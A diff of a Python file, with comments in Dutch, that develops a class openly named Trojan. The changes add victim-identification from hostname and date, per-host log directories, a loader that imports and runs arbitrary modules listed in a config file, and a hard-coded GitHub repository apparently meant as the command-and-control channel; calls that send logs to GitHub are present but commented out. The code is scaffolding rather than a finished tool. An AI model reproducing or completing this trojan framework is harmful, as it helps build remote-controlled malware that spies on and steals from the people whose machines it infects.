@@ -3,20 +3,41 @@ import socket
 import datetime
 import random
 import os
+import json
+from importlib import import_module
+
 
 
 class Trojan():
-    def __init__(self,repo_url,id):
+    def __init__(self,repo_url):
         self.repo_url = repo_url
         self.github_connectie = Github(self.repo_url)
-        self.id = id
+        self.id = ''
+        self.first_time = False
 
     def run(self):
-        self.generate_unique_id()
-        self.create_directory_in_logs()
+        if self.first_time == False:
+            self.generate_unique_id()
+            self.create_directory_in_logs()
+            self.run_modules()
 
-        print(Github.check_remote_repo())
+        # self.github_connectie.check_remote_repo()
         
+        # print(self.github_connectie.send_logs_to_github(self.id))
+
+    def run_modules(self):
+        """Deze functie zal alle modules inladen van de config en ze ook runnen """
+        config_path = "config/config.txt"  # Het pad naar het configuratiebestand
+        with open(config_path, "r") as config_file:
+            config = json.load(config_file)
+            for module_data in config:
+                module_name = module_data["module_name"]
+                class_name = module_data["class_name"]
+                module_path = f"modules.{module_name}"
+                module = import_module(module_path)
+                my_class = getattr(module, class_name)()
+                my_class.log(self.id)
+
 
     def generate_unique_id(self):
         """Deze functie zal unique id maken op basis van de hostname + datum + een random nummer"""
@@ -31,17 +52,15 @@ class Trojan():
         logs_directory = "logs"
         new_directory_path = os.path.join(logs_directory, self.id)
         if not os.path.exists(logs_directory):
-            print(f"De map '{logs_directory}' bestaat niet.")
             return
         if os.path.exists(new_directory_path):
             return
         os.makedirs(new_directory_path)
-        print(f"De map '{new_directory_path}' is succesvol aangemaakt.")
 
 
 
 def main():
-    trojan = Trojan('REPO')
+    trojan = Trojan('git@github.com:laurensDSM/test0.git')
     trojan.run()
 
 
